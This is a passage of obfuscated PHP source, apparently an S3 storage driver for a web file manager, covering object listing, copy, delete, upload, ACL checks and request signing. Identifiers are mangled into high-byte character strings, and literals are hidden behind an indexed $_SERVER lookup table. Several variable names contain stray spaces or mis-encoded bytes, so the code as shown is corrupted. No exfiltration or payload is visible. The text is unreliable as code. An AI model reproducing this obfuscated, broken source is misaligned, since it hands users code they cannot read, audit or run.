"\x28\60\51{$Ñ¼™°ı£}"; for ($Ö–ë¸Ã‚ = 1; $Ö–ë¸Ã‚ <= count($ÛÍİşŞò) + 1; $Ö–ë¸Ã‚++) { $‰Ó²èì½ = $„µ’´‰ . "\50{$Ö–ë¸Ã‚}\51{$Ñ¼™°ı£}"; if (!in_array_not_case($‰Ó²èì½, $ÛÍİşŞò)) { return $‰Ó²èì½; } } return $‰Ó²èì½; } public function listAllFiles($»Ö˜è¥Ù, $¦¶æáû) { $Ã†ğì¦Ç =& $_SERVER[çâ¥×ø³]; if (empty($¦¶æáû)) { return array(); } $ÅÙÌ’Öö = array_keys($¦¶æáû); $Ú¹Ù°¸Æ = array(); $»Ö˜è¥Ù = trim($»Ö˜è¥Ù, $Ã†ğì¦Ç[8]); foreach ($¦¶æáû as $Õ£Ã›ö° => $ÅºÒû‚­) { $·öÕ½÷ = ltrim(substr(trim($Õ£Ã›ö°, $Ã†ğì¦Ç[8]), strlen($»Ö˜è¥Ù)), $Ã†ğì¦Ç[8]); if (substr($Õ£Ã›ö°, -1) == $Ã†ğì¦Ç[8]) { $·öÕ½÷ = rtrim($·öÕ½÷, $Ã†ğì¦Ç[8]) . $Ã†ğì¦Ç[8]; } $Ú¹Ù°¸Æ = array_merge($Ú¹Ù°¸Æ, $this->slicePath($·öÕ½÷)); } $¦ï”‰¿Î = array(); foreach (array_unique($Ú¹Ù°¸Æ) as $öÎ†å³Ï) { $ƒ™¿¥Á¬ = array($Ã†ğì¦Ç[84] => $this->getPathOuter($Ã†ğì¦Ç[8] . $»Ö˜è¥Ù . $Ã†ğì¦Ç[8] . $öÎ†å³Ï), $Ã†ğì¦Ç[75] => 1, $Ã†ğì¦Ç[76] => 0); if (substr($öÎ†å³Ï, -1) != $Ã†ğì¦Ç[8]) { $ƒ™¿¥Á¬[$Ã†ğì¦Ç[75]] = 0; $˜ØÛçÁ² = $this->getPath($»Ö˜è¥Ù . $Ã†ğì¦Ç[8] . $öÎ†å³Ï); if (isset($¦¶æáû[$˜ØÛçÁ²])) { $‹ÃŒÂÚƒ = $¦¶æáû[$˜ØÛçÁ²]; if (isset($‹ÃŒÂÚƒ[$Ã†ğì¦Ç[76]])) { $ƒ™¿¥Á¬[$Ã†ğì¦Ç[76]] = intval($‹ÃŒÂÚƒ[$Ã†ğì¦Ç[76]]); } if (isset($‹ÃŒÂÚƒ[$Ã†ğì¦Ç[194]])) { $ƒ™¿¥Á¬[$Ã†ğì¦Ç[85]] = intval($‹ÃŒÂÚƒ[$Ã†ğì¦Ç[194]]); } } } $¦ï”‰¿Î[] = $ƒ™¿¥Á¬; } return $¦ï”‰¿Î; } public function slicePath($ÎÔ¹³“¡) { $æ–âœŞÜ =& $_SERVER[çâ¥×ø³]; $ØÏ—ä¿ = explode($æ–âœŞÜ[8], trim($ÎÔ¹³“¡, $æ–âœŞÜ[8])); $Ãè÷Í³ = 0; do { ++$Ãè÷Í³; $¿û­“¢¢[] = implode($æ–âœŞÜ[8], array_slice($ØÏ—ä¿, 0, $Ãè÷Í³)) . $æ–âœŞÜ[8]; } while ($Ãè÷Í³ < count($ØÏ—ä¿)); $¿û­“¢¢[count($ØÏ—ä¿) - 1] = $ÎÔ¹³“¡; return $¿û­“¢¢; } public function getHost() { $›èòñ‚È =& $_SERVER[çâ¥×ø³]; $”ë³Ì¥õ = parse_url(trim($this->domain, $›èòñ‚È[8])); $ÈÂÅ‘¥š = isset($”ë³Ì¥õ[$›èòñ‚È[195]]) ? $”ë³Ì¥õ[$›èòñ‚È[195]] : http_type(); $ê³”ÊŞ = isset($”ë³Ì¥õ[$›èòñ‚È[196]]) ? $”ë³Ì¥õ[$›èòñ‚È[196]] : $”ë³Ì¥õ[$›èòñ‚È[84]]; if (isset($”ë³Ì¥õ[$›èòñ‚È[197]])) { $ê³”ÊŞ .= $›èòñ‚È[4] . $”ë³Ì¥õ[$›èòñ‚È[197]]; } return $ÈÂÅ‘¥š . $›èòñ‚È[198] . $ê³”ÊŞ; } public function pathEncode($àË£Çô) { $¿îúš³İ =& $_SERVER[çâ¥×ø³]; return str_replace($¿îúš³İ[199], $¿îúš³İ[8], rawurlencode($àË£Çô)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($²‚—Ä´á) { set_timeout(); require_once SDK_DIR . $_SERVER[çâ¥×ø³][200]; parent::__construct(); $this->_init($²‚—Ä´á); } public function _init($ğ­±…ùø) { $this->config = $ğ­±…ùø; foreach ($ğ­±…ùø as $ç¼ìÚÍ· => $–ÙŸğÓÊ) { if (isset($this->{$ç¼ìÚÍ·})) { $this->{$ç¼ìÚÍ·} = $–ÙŸğÓÊ; } } $this->endpoint = $ğ­±…ùø[$_SERVER[çâ¥×ø³][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ïáª£†Ù = "\x76\64") { $this->signVer = $ïáª£†Ù; $this->client->setSignatureVersion($ïáª£†Ù); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÉÊ—êÁ¨ =& $_SERVER[çâ¥×ø³]; $å²óÓÜø = $this->getBucketCors(); if (!$å²óÓÜø || !is_array($å²óÓÜø)) { return !1; } if ($å²óÓÜø[$ÉÊ—êÁ¨[202]] != $ÉÊ—êÁ¨[203] || $å²óÓÜø[$ÉÊ—êÁ¨[204]] != $ÉÊ—êÁ¨[203]) { return !1; } $œºÁ‚—¥ = array_map($ÉÊ—êÁ¨[205], $å²óÓÜø[$ÉÊ—êÁ¨[206]]); if (!is_array($œºÁ‚—¥)) { $œºÁ‚—¥ = array(); } $Ãºó„Ûá = array($ÉÊ—êÁ¨[207], $ÉÊ—êÁ¨[208], $ÉÊ—êÁ¨[209], $ÉÊ—êÁ¨[210], $ÉÊ—êÁ¨[211]); $İ„ĞËÖ¤ = array_diff($Ãºó„Ûá, $œºÁ‚—¥); return empty($İ„ĞËÖ¤); } public function mkfile($ş×ÆÀ´·, $Ô¿Ü«§ = '', $Üµ„ğ° = REPEAT_RENAME) { $ƒÔ…ÆÂ = $this->setContent($ş×ÆÀ´·, $Ô¿Ü«§); if ($ƒÔ…ÆÂ !== !1) { return $this->getPathOuter($ş×ÆÀ´·); } return !1; } public function mkdir($­Ï®, $ªæç„¨° = REPEAT_SKIP) { $™£ãÛ–° =& $_SERVER[çâ¥×ø³]; if (empty($­Ï®) && $­Ï® !== $™£ãÛ–°[212]) { return !1; } if ($ªæç„¨° && $this->_isFolder($­Ï®)) { return $this->getPathOuter($­Ï®); } $«™Î¢› = $this->setContent($­Ï®, $™£ãÛ–°[12], !0); if ($«™Î¢› !== !1) { return $this->getPathOuter($­Ï®); } return !1; } public function copyFile($±³œß¦¯, $¸ÆÅŞ„¡, $Ò§§™©© = array()) { $ÎÌüó‚ú =& $_SERVER[çâ¥×ø³]; $¸ºı­å = $this->objectMeta($±³œß¦¯); if (!$¸ºı­å) { return !1; } if ($¸ºı­å[$ÎÌüó‚ú[76]] <= 1024 * 1024 * 200) { $€ÍïÙÚ = $this->client->copyObject($this->bucket, $±³œß¦¯, $this->bucket, $¸ÆÅŞ„¡, $ÎÌüó‚ú[213], $Ò§§™©©); } else { $€ÍïÙÚ = $this->client->multiCopyObject($this->bucket, $±³œß¦¯, $this->bucket, $¸ÆÅŞ„¡, $Ò§§™©©); } $€ÍïÙÚ = $€ÍïÙÚ ? $this->getPathOuter($¸ÆÅŞ„¡) : !1; return $€ÍïÙÚ; } public function moveFile($è©€ Â—, $¤³£¤—‘) { if ($this->copyFile($è©€ Â—, $¤³£¤—‘)) { $this->delFile($è©€ Â—); return $this->getPathOuter($¤³£¤—‘); } return !1; } public function delFile($ºÒ‹È²) { return $this->client->deleteObject($this->bucket, $ºÒ‹È²); } public function delFolder($‘´Û¥£›) { $›ˆÅ…İ =& $_SERVER[çâ¥×ø³]; if (!$this->exist($‘´Û¥£›)) { return !0; } $this->listItemCache = !1; $é¿šÆÍ¡ = $this->fileList($‘´Û¥£›); $this->listItemCache = !0; $‚ĞË·‡á = trim($‘´Û¥£›, $›ˆÅ…İ[8]) . $›ˆÅ…İ[8]; if (!empty($‘´Û¥£›) && $‘´Û¥£› !== $›ˆÅ…İ[212] && !in_array($‚ĞË·‡á, $é¿šÆÍ¡[$›ˆÅ…İ[82]])) { $é¿šÆÍ¡[$›ˆÅ…İ[82]][] = $‚ĞË·‡á; } $ùÂÈ¿çÎ = $this->delByBatch($é¿šÆÍ¡[$›ˆÅ…İ[83]]); if (!$ùÂÈ¿çÎ) { return !1; } $ùÂÈ¿çÎ = $this->delByBatch($é¿šÆÍ¡[$›ˆÅ…İ[82]]); if (!$ùÂÈ¿çÎ) { return !1; } return $this->delFile($‚ĞË·‡á); } private function delByBatch($Ñ…À¼–Ñ) { foreach (array_chunk($Ñ…À¼–Ñ, 1000) as $”ş¨å×æ) { $Œ“Å©ÊÙ = $this->client->deleteObjects($this->bucket, $”ş¨å×æ); if (!$Œ“Å©ÊÙ) { return !1; } } return !0; } public function rename($‰ ÏñÅ¤, $…çôÈÄ) { return $this->renameObject($‰ ÏñÅ¤, $…çôÈÄ); } public function listPath($‘Ä²Ğ½Ÿ, $š€Å§ï = false) { $ÇøêàÅ =& $_SERVER[çâ¥×ø³]; $·ô„ÇĞ¸ = $this->fileList($‘Ä²Ğ½Ÿ, $ÇøêàÅ[8], !0); foreach ($·ô„ÇĞ¸[$ÇøêàÅ[82]] as $§¢ÛêÛ¦ => $Ìàñ‚Š) { $·ô„ÇĞ¸[$ÇøêàÅ[82]][$§¢ÛêÛ¦] = $this->folderInfo($Ìàñ‚Š, $š€Å§ï, $Ìàñ‚Š); } foreach ($·ô„ÇĞ¸[$ÇøêàÅ[83]] as $§¢ÛêÛ¦ => $Ìàñ‚Š) { $·ô„ÇĞ¸[$ÇøêàÅ[83]][$§¢ÛêÛ¦] = $this->fileInfo($Ìàñ‚Š[$ÇøêàÅ[32]], $š€Å§ï, $Ìàñ‚Š); } return $·ô„ÇĞ¸; } protected function infoChildren($Æ×ä¼ªŸ, &$—½»â«ß) { $Ó„ªÄ©‡ =& $_SERVER[çâ¥×ø³]; $‡û…­š» = $this->fileList($Æ×ä¼ªŸ, $Ó„ªÄ©‡[12], !0); $—½»â«ß[$Ó„ªÄ©‡[78]] += count($‡û…­š»[$Ó„ªÄ©‡[82]]); $—½»â«ß[$Ó„ªÄ©‡[77]] += count($‡û…­š»[$Ó„ªÄ©‡[83]]); foreach ($‡û…­š»[$Ó„ªÄ©‡[83]] as $«€êáö®) { if (!$«€êáö® || !$«€êáö®[$Ó„ªÄ©‡[76]]) { continue; } $—½»â«ß[$Ó„ªÄ©‡[76]] += $«€êáö®[$Ó„ªÄ©‡[76]]; } } private function fileInfo($ÖÒ„èì, $•æ¡’õğ = false, $ºşçØ© = array()) { $ˆüèå¡ =& $_SERVER[çâ¥×ø³]; $±‘¬†éÅ = array($ˆüèå¡[32] => $this->pathThis($ÖÒ„èì), $ˆüèå¡[84] => $this->getPathOuter($ÖÒ„èì), $ˆüèå¡[33] => $ˆüèå¡[214], $ˆüèå¡[175] => $this->ext($ÖÒ„èì), $ˆüèå¡[76] => isset($ºşçØ©[$ˆüèå¡[76]]) ? $ºşçØ©[$ˆüèå¡[76]] : 0); if ($•æ¡’õğ) { return $±‘¬†éÅ; } $±‘¬†éÅ[$ˆüèå¡[215]] = $±‘¬†éÅ[$ˆüèå¡[85]] = 0; $±‘¬†éÅ[$ˆüèå¡[216]] = $±‘¬†éÅ[$ˆüèå¡[217]] = !0; if (empty($ºşçØ©)) { $ºşçØ© = $this->objectMeta($ÖÒ„èì); if (!$ºşçØ©) { return $±‘¬†éÅ; } } if (isset($ºşçØ©[$ˆüèå¡[218]]) && $ºşçØ©[$ˆüèå¡[218]]) { $±‘¬†éÅ[$ˆüèå¡[219]] = $ºşçØ©[$ˆüèå¡[218]]; } if (isset($ºşçØ©[$ˆüèå¡[194]])) { $±‘¬†éÅ[$ˆüèå¡[85]] = $ºşçØ©[$ˆüèå¡[194]]; } if (isset($ºşçØ©[$ˆüèå¡[76]])) { $±‘¬†éÅ[$ˆüèå¡[76]] = $ºşçØ©[$ˆüèå¡[76]]; } return $±‘¬†éÅ; } private function folderInfo($ÌãíàÒ, $Î‚‰¹¹é = false, $¦ĞÔÒ‚½ = array()) { $ç„×€´ =& $_SERVER[çâ¥×ø³]; $¤ø™ª¶– = array($ç„×€´[32] => $this->pathThis($ÌãíàÒ), $ç„×€´[84] => $this->getPathOuter($ç„×€´[8] . $ÌãíàÒ), $ç„×€´[33] => $ç„×€´[75]); if ($Î‚‰¹¹é) { return $¤ø™ª¶–; } $¤ø™ª¶–[$ç„×€´[215]] = $¤ø™ª¶–[$ç„×€´[85]] = 0; $¤ø™ª¶–[$ç„×€´[216]] = $¤ø™ª¶–[$ç„×€´[217]] = !0; if ($ÌãíàÒ == $ç„×€´[12]) { return $¤ø™ª¶–; } if (empty($¦ĞÔÒ‚½)) { $¦ĞÔÒ‚½ = $this->objectMeta(trim($ÌãíàÒ, $ç„×€´[8]) . $ç„×€´[8]); } if (isset($¦ĞÔÒ‚½[$ç„×€´[194]])) { $¤ø™ª¶–[$ç„×€´[215]] = $¦ĞÔÒ‚½[$ç„×€´[194]]; } return $¤ø™ª¶–; } private function fileList($á†·íèì, $Û©—™ = '', $œÑ½ÖãÊ = 0) { $É“©“÷® =& $_SERVER[çâ¥×ø³]; $ıÀ³î¹ = rtrim($á†·íèì, $É“©“÷®[8]) . $É“©“÷®[8]; $ ÄÙ“ = $this->listObjs($ıÀ³î¹, null, null, $Û©—™); if (!$ ÄÙ“) { return array($É“©“÷®[82] => array(), $É“©“÷®[83] => array()); } $‰ ä­¯à = $Ãñ»áóõ = array(); foreach ($ ÄÙ“[$É“©“÷®[220]] as $¿ŞÅŸ÷ˆ) { $™Èš»”ú = $¿ŞÅŸ÷ˆ[$É“©“÷®[32]]; if ($™Èš»”ú == $ıÀ³î¹) { continue; } $¥¨¾×îÇ = isset($¿ŞÅŸ÷ˆ[$É“©“÷®[76]]) ? $¿ŞÅŸ÷ˆ[$É“©“÷®[76]] : 0; $©Üè²éÜ = $¥¨¾×îÇ == 0 && substr($™Èš»”ú, strlen($™Èš»”ú) - 1, 1) == $É“©“÷®[8] ? !0 : !1; $this->cacheMethodInfoSet($™Èš»”ú, $©Üè²éÜ, $¿ŞÅŸ÷ˆ); if ($©Üè²éÜ) { $‰ ä­¯à[] = $™Èš»”ú; continue; } $Ãñ»áóõ[] = $œÑ½ÖãÊ ? $¿ŞÅŸ÷ˆ : $™Èš»”ú; } foreach ($ ÄÙ“[$É“©“÷®[221]] as $¿ŞÅŸ÷ˆ) { $‰ ä­¯à[] = $¿ŞÅŸ÷ˆ[$É“©“÷®[32]]; $this->cacheMethodInfoSet($¿ŞÅŸ÷ˆ[$É“©“÷®[32]], !0); } $this->cacheMethodInfoSet($á†·íèì, !0); return array($É“©“÷®[82] => $‰ ä­¯à, $É“©“÷®[83] => $Ãñ»áóõ); } private function listObjs($á×ÌòÈ³, $È­¤ÌÙŞ = null, $ØÕñ¹ ú = null, $ÇÕµŸ«Ä = null) { $²ú³ô  =& $_SERVER[çâ¥×ø³]; $á×ÌòÈ³ = trim($á×ÌòÈ³, $²ú³ô [8]); $ÆàÊáÊ¹ = empty($á×ÌòÈ³) && $á×ÌòÈ³ !== $²ú³ô [212] ? $²ú³ô [12] : $á×ÌòÈ³ . $²ú³ô [8]; return $this->client->getBucket($this->bucket, $ÆàÊáÊ¹, $È­¤ÌÙŞ, $ØÕñ¹ ú, $ÇÕµŸ«Ä, !0); } public function has($ÚÑ‘å‘, $ÓĞ”À¡ı = false, $Ø³’‘‰À = true) { $ª½Ş¸¡× =& $_SERVER[çâ¥×ø³]; $ÚÑ‘å‘ = trim($ÚÑ‘å‘, $ª½Ş¸¡×[8]); $Ù²âğ‹Ş = empty($ÚÑ‘å‘) && $ÚÑ‘å‘ !== $ª½Ş¸¡×[212] ? $ª½Ş¸¡×[12] : $ÚÑ‘å‘ . $ª½Ş¸¡×[8]; $¦–Ê„éÂ = null; $Ã¸ù·Ù = 500; $•òÇ‹‹Ì = $ª½Ş¸¡×[8]; $Ü›¶¼Í… = $¦á˜‰¶ˆ = array(); while (!0) { $ô´Ëò«ê = $this->listObjs($ÚÑ‘å‘, $¦–Ê„éÂ, $Ã¸ù·Ù, $•òÇ‹‹Ì); if (!$ô´Ëò«ê) { break; } $¦–Ê„éÂ = $ô´Ëò«ê[$ª½Ş¸¡×[222]]; $‹ÎğÆí‘ = $ô´Ëò«ê[$ª½Ş¸¡×[220]]; $´×ó©è² = $ô´Ëò«ê[$ª½Ş¸¡×[221]]; if (empty($‹ÎğÆí‘) && empty($´×ó©è²)) { break; } if (count($‹ÎğÆí‘) == 1 && $‹ÎğÆí‘[0][$ª½Ş¸¡×[32]] == $Ù²âğ‹Ş) { break; } if ($ÓĞ”À¡ı) { if (count($‹ÎğÆí‘)) { $‹ÎğÆí‘ = array_column($‹ÎğÆí‘, $ª½Ş¸¡×[32]); $Ü›¶¼Í… = array_merge($Ü›¶¼Í…, $‹ÎğÆí‘); } if (count($´×ó©è²)) { $´×ó©è² = array_column($´×ó©è², $ª½Ş¸¡×[32]); $¦á˜‰¶ˆ = array_merge($¦á˜‰¶ˆ, $´×ó©è²); } if ($¦–Ê„éÂ === null) { break; } continue; } if ($Ø³’‘‰À) { if (!empty($‹ÎğÆí‘)) { if (count($‹ÎğÆí‘) > 1 || isset($‹ÎğÆí‘[0][$ª½Ş¸¡×[32]]) && $‹ÎğÆí‘[0][$ª½Ş¸¡×[32]] != $Ù²âğ‹Ş) { return !0; } } } else { if (!empty($´×ó©è²)) { return !0; } } if ($¦–Ê„éÂ === null) { break; } } if ($ÓĞ”À¡ı) { $Ü›¶¼Í… = array_diff($Ü›¶¼Í…, array($Ù²âğ‹Ş)); $Ü›¶¼Í… = count(array_unique($Ü›¶¼Í…)); $¦á˜‰¶ˆ = count(array_unique($¦á˜‰¶ˆ)); return array($ª½Ş¸¡×[223] => $Ü›¶¼Í…, $ª½Ş¸¡×[224] => $¦á˜‰¶ˆ); } return !1; } public function listAll($î‰—‚ö) { $€ó Ëˆâ =& $_SERVER[çâ¥×ø³]; $Ô³éÓ¢ù = $this->fileList($î‰—‚ö, $€ó Ëˆâ[12], !0); $ÒÊò = array_to_keyvalue($Ô³éÓ¢ù[$€ó Ëˆâ[83]], $€ó Ëˆâ[32]); foreach ($Ô³éÓ¢ù[$€ó Ëˆâ[82]] as $ñÑ£ŒÕ„) { if (is_string($ñÑ£ŒÕ„)) { $ÒÊò[$ñÑ£ŒÕ„] = array($€ó Ëˆâ[76] => 0); } } return $this->listAllFiles($î‰—‚ö, $ÒÊò); } public function canRead($şõÌˆ·) { $™ŒæÌ…œ =& $_SERVER[çâ¥×ø³]; $ºá¥á‡ï = $this->client->getAccessControlPolicy($this->bucket, $şõÌˆ·); if (!$ºá¥á‡ï) { return !1; } return in_array($ºá¥á‡ï, array($™ŒæÌ…œ[225], $™ŒæÌ…œ[226], $™ŒæÌ…œ[227])) ? !0 : !1; } public function canWrite($î¤òÍáí) { $İ’¿£¥— =& $_SERVER[çâ¥×ø³]; $¿Ùáí°ƒ = $this->client->getAccessControlPolicy($this->bucket, $î¤òÍáí); if (!$¿Ùáí°ƒ) { return !1; } return in_array($¿Ùáí°ƒ, array($İ’¿£¥—[225], $İ’¿£¥—[226])) ? !0 : !1; } public function getContent($ıÜ–”í) { return $this->client->getObject($this->bucket, $ıÜ–”í); } public function setContent($Óø……ùç, $¦¼ÖŒ® = '', $Á®Ï˜û = false) { $ºªˆıÉ§ =& $_SERVER[çâ¥×ø³]; $Óø……ùç = $Á®Ï˜û ? trim($Óø……ùç, $ºªˆıÉ§[8]) . $ºªˆıÉ§[8] : $Óø……ùç; $ÜŞ‹Ÿ³  = get_file_mime(get_path_ext($Óø……ùç)); $Çò™ç–õ = $this->client->putObject($¦¼ÖŒ®, $this->bucket, $Óø……ùç, $ºªˆıÉ§[213], array(), $ÜŞ‹Ÿ³ ); if (!$Çò™ç–õ) { return !1; } if ($Á®Ï˜û) { return !0; } $this->cacheMethod(null, null); $Çò™ç–õ = $this->copyFile($Óø……ùç, $Óø……ùç, array($ºªˆıÉ§[228] => $Çò™ç–õ[$ºªˆıÉ§[218]])); return $Çò™ç–õ ? !0 : !1; } public function fileSubstr($àšíè÷, $ëÙ£ƒÍ, $ï¬÷ƒàÒ) { $àÅ®á = $ëÙ£ƒÍ + $ï¬÷ƒàÒ - 1; return $this->client->getObject($this->bucket, $àšíè÷, array($_SERVER[çâ¥×ø³][229] => "\142\x79\x74\145\x73\x3d{$ëÙ£ƒÍ}\x2d{$àÅ®á}")); } public function upload($´Ï¡ òå, $ÄÂÕà³Ø, $³„ä¬ìµ = false, $ØÕë»¢× = REPEAT_REPLACE) { $£ß£ßĞˆ =& $_SERVER[çâ¥×ø³]; $©›—ç«Œ = array($£ß£ßĞˆ[228] => @md5_file($ÄÂÕà³Ø)); $ªšòÑ’â = array($£ß£ßĞˆ[230] => get_file_mime(get_path_ext($´Ï¡ òå))); if (IO::size($ÄÂÕà³Ø) <= 1024 * 1024 * 200) { $¢ô‹®„€ = $this->client->putObjectFile($ÄÂÕà³Ø, $this->bucket, $´Ï¡ òå, $£ß£ßĞˆ[213], $©›—ç«Œ, $ªšòÑ’â); return !empty($¢ô‹®„€) ? $this->getPathOuter($´Ï¡ òå) : !1; } $¹ÚÉéüš = $this->client->multiUploadObject($ÄÂÕà³Ø, $this->bucket, trim($´Ï¡ òå, $£ß£ßĞˆ[8]), $©›—ç«Œ, $ªšòÑ’â); return $¹ÚÉéüš ? $this->getPathOuter($´Ï¡ òå) : !1; } public function download($îû­Çè†, $Óñ‹‘‹®) { if (!@is_dir($this->pathFather($Óñ‹‘‹®)) && !IO::mkdir($this->pathFather($Óñ‹‘‹®))) { return !1; } $² ËÌñˆ = $this->client->getObject($this->bucket, $îû­Çè†, array(), $Óñ‹‘‹®); return $² ËÌñˆ !== !1 ? $Óñ‹‘‹® : !1; } public function link($¥†§ŞÏà, $®ìÙøôÄ = array()) { $ü”Êš÷ß =& $_SERVER[çâ¥×ø³]; if ($this->signVer == $ü”Êš÷ß[231]) { return $this->client->getAuthenticatedURL($this->bucket, $¥†§ŞÏà, 3600 * 12, $®ìÙøôÄ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¥†§ŞÏà, $ü”Êš÷ß[8]), 3600 * 12, $this->region, array(), !0, $®ìÙøôÄ); } public function fileOut($§ˆÌˆ±», $÷º¦±¤ø = false, $òĞºâÓ½ = false, $ì¹´ÁÀ = '') { $Ÿ¢šö²† =& $_SERVER[çâ¥×ø³]; if ($this->isFileOutServer()) { return $this->fileOutServer($§ˆÌˆ±», $÷º¦±¤ø, $òĞºâÓ½, $ì¹´ÁÀ); } if (!$òĞºâÓ½) { $òĞºâÓ½ = $this->pathThis($§ˆÌˆ±»); } $Ôİºú¯ = get_file_mime(get_path_ext($òĞºâÓ½)); if ($Ôİºú¯ == $Ÿ¢šö²†[232]) { return parent::fileOut($§ˆÌˆ±», $÷º¦±¤ø, $òĞºâÓ½, $ì¹´ÁÀ); } $Ôœ…ÛŸÌ = array($Ÿ¢šö²†[233] => $Ôİºú¯); if ($÷º¦±¤ø) { $Ôœ…ÛŸÌ[$Ÿ¢šö²†[234]] = $Ÿ¢šö²†[235] . rawurlencode($òĞºâÓ½); } else { } $›ÕÌš¸° = $this->link($§ˆÌˆ±», $Ôœ…ÛŸÌ); $this->fileOutLink($›ÕÌš¸°); } public function fileOutServer($¡â‡‘’, $ÔÂÆÓú  = false, $ˆ¯ò‹Ùœ = false, $ìÊËÛ‘¯ = '') { parent::fileOut($¡â‡‘’, $ÔÂÆÓú , $ˆ¯ò‹Ùœ, $ìÊËÛ‘¯); } public function fileOutImageServer($ÂËã¢ç , $×Ê‹Œ® = 250) { parent::fileOutImage($ÂËã¢ç , $×Ê‹Œ®); } public function hashMd5($« Ó‰êÁ, $ìş†æĞ„ = '') { $Ìğ¼Å¦ =& $_SERVER[çâ¥×ø³]; $Ç“ı¹ßæ = $this->objectMeta($« Ó‰êÁ); if (!$Ç“ı¹ßæ) { return !1; } $ìş†æĞ„ = $ìş†æĞ„ ? $ìş†æĞ„ : _get($Ç“ı¹ßæ, $Ìğ¼Å¦[236]); $ìş†æĞ„ = $ìş†æĞ„ ? $ìş†æĞ„ : _get($Ç“ı¹ßæ, $Ìğ¼Å¦[218], $Ìğ¼Å¦[12]); return $ìş†æĞ„; } public function uploadFormData($—ØíĞÎ÷, $Œèú¤÷ñ = 3600) { $˜á–²î„ =& $_SERVER[çâ¥×ø³]; $†ŸºöŞ = $this->pathFather($—ØíĞÎ÷); $Ğ¹€ÕÓÔ = $this->client->getHttpUploadPostParams($this->bucket, $†ŸºöŞ, $˜á–²î„[213], $Œèú¤÷ñ); return array_merge((array) $Ğ¹€ÕÓÔ, array($˜á–²î„[196] => $this->getHost())); } public function multiUploadFormData($‚…½·Ğ¤, $¦é£ªÎÅ = 3600) { $£š¦Ê½Ø =& $_SERVER[çâ¥×ø³]; $Ë®—·í = gmdate($£š¦Ê½Ø[237]); $«ô×¼äí = array(); $«¯Šé¼ = $this->client->getUploadId($this->bucket, $‚…½·Ğ¤, $«ô×¼äí); if (!$«¯Šé¼) { return !1; } return array($£š¦Ê½Ø[238] => $«¯Šé¼, $£š¦Ê½Ø[196] => $this->getHost() . $£š¦Ê½Ø[8] . $this->pathEncode($‚…½·Ğ¤), $£š¦Ê½Ø[239] => $Ë®—·í, $£š¦Ê½Ø[94] => $‚…½·Ğ¤); } public function multiUploadAuthData($£îçÖ¿, $í»Í„ = array()) { $Ş…Ó·Úà =& $_SERVER[çâ¥×ø³]; $ÀÀïşÌ = isset($í»Í„[$Ş…Ó·Úà[239]]) ? $í»Í„[$Ş…Ó·Úà[239]] : gmdate($Ş…Ó·Úà[237]); $Ê²ØâÑ¬ = isset($í»Í„[$Ş…Ó·Úà[175]]) ? $í»Í„[$Ş…Ó·Úà[175]] : $Ş…Ó·Úà[12]; $“®Şş‘ = $í»Í„[$Ş…Ó·Úà[94]]; unset($í»Í„[$Ş…Ó·Úà[94]]); if (isset($í»Í„[$Ş…Ó·Úà[240]])) { $í»Í„[$Ş…Ó·Úà[239]] = $ÀÀïşÌ; return $this->listUploadParts($“®Şş‘, $í»Í„); } $é½­±ã¦ = array($Ş…Ó·Úà[241], $Ş…Ó·Úà[12], $Ş…Ó·Úà[120], $Ş…Ó·Úà[12], "\170\x2d\141\x6d\x7a\x2d\x64\141\164\145\72{$ÀÀïşÌ}", $Ş…Ó·Úà[8] . $this->bucket . $Ş…Ó·Úà[8] . $this->pathEncode($“®Şş‘) . $Ê²ØâÑ¬); if (strpos($Ê²ØâÑ¬, $Ş…Ó·Úà[242]) === 0) { $é½­±ã¦[0] = $Ş…Ó·Úà[243]; } if (isset($í»Í„[$Ş…Ó·Úà[244]]) && $í»Í„[$Ş…Ó·Úà[244]] == $Ş…Ó·Úà[245]) { $é½­±ã¦[0] = $Ş…Ó·Úà[245]; } $êı¯ğèÙ = implode($Ş…Ó·Úà[246], $é½­±ã¦); $Ò¸¹¦ç  = base64_encode(hash_hmac($Ş…Ó·Úà[247], $êı¯ğèÙ, $this->secret, !0)); $ä…¤•ğŞ = $Ş…Ó·Úà[248] . $this->accessKey . $Ş…Ó·Úà[4] . $Ò¸¹¦ç ; if (strpos($Ê²ØâÑ¬, $Ş…Ó·Úà[242]) === 0) { return array($Ş…Ó·Úà[249] => $ä…¤•ğŞ, $Ş…Ó·Úà[239] => $ÀÀïşÌ); } return $ä…¤•ğŞ; } public function listUploadParts($éË†²”‰, $Š¿ğ§ï = array()) { $Şú‚µù =& $_SERVER[çâ¥×ø³]; $’ÌŸ­ùÎ = str_replace($Şú‚µù[250], $Şú‚µù[12], $Š¿ğ§ï[$Şú‚µù[175]]); $´Õ†åªõ = $this->client->listParts($this->bucket, $éË†²”‰, $’ÌŸ­ùÎ); if (!$´Õ†åªõ) { return !1; } unset($Š¿ğ§ï[$Şú‚µù[240]], $Š¿ğ§ï[$Şú‚µù[244]]); $Š¿ğ§ï[$Şú‚µù[94]] = $éË†²”‰; $ä›í†° = $this->multiUploadAuthData($éË†²”‰, $Š¿ğ§ï); if (empty($ä›í†°)) { return !1; } return array($Şú‚µù[249] => $ä›í†°, $Şú‚µù[239] => $Š¿ğ§ï[$Şú‚µù[239]], $Şú‚µù[251] => $´Õ†åªõ); } public function getHost() { return parent::getHost() . $_SERVER[çâ¥×ø³][8] . $this->bucket; } public function size($°€İÉ‰¯) { $í´ìÜÀš = $this->objectMeta($°€İÉ‰¯); return $í´ìÜÀš ? $í´ìÜÀš[$_SERVER[çâ¥×ø³][76]] : 0; } public function info($îÜ½×µé) { if ($this->isFolder($îÜ½×µé)) { return $this->folderInfo($îÜ½×µé); } else { if ($this->isFile($îÜ½×µé)) { return $this->fileInfo($îÜ½×µé); } } return !1; } public function exist($˜š…¨Ñ˜) { return $this->isFile($˜š…¨Ñ˜) || $this->isFolder($˜š…¨Ñ˜); } public function isFile($¬ÓóŞƒ£) { return !$this->isFolder($¬ÓóŞƒ£) && $this->objectMeta($¬ÓóŞƒ£); } public function isFolder($é”Æä·’) { return 